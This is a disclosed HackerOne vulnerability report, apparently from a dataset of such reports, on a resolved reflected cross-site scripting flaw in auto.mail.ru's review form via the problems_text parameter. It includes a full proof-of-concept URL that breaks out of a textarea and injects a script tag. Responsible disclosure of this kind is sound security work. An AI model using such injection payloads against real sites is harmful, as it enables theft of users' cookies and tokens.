---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '536341'
original_report_id: '536341'
title: Reflected cross site scripting at https://auto.mail.ru/reviews/add_review/
  via problems_text parameter.
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: mailru
created_at: '2019-04-12T03:29:26.190Z'
disclosed_at: '2019-05-07T08:34:10.838Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 8
asset_identifier: '*.mail.ru / Mail.Ru - another project (except subdomains delegated
  to external entities)'
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# Reflected cross site scripting at https://auto.mail.ru/reviews/add_review/ via problems_text parameter.

## Metadata

- HackerOne Report ID: 536341
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: mailru
- Disclosed At: 2019-05-07T08:34:10.838Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

##Description

`https://auto.mail.ru` is vulnerable for xss. It is possible for an attacker to inject arbitrary JavaScript in application response

##Step to reproduce

1. Open the below link in Firefox.
`https://auto.mail.ru/reviews/add_review/?firm_id=&csrf_token=AG_v2rsLIntEJUyXgRwSuoGq&id=&body_type=10&run_current=1234&design_grade=&comfortability_grade=&running_characteristics_grade=&ergonomics_grade=&reliability_grade=&service_availability_grade=&photos=&common_text=1234&advantages_text=25&problems_text=1234</textarea ><script>alert(document.domain)</script>&review_submit=`

2. XSS will execute

##Supporting Material/References:
Attached vulnerable link.

## Impact

An attacker can bypass SOP with XSS and hence can read the sensitive data of application like a user cookies, csrf token and can perform other sort of attacks.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
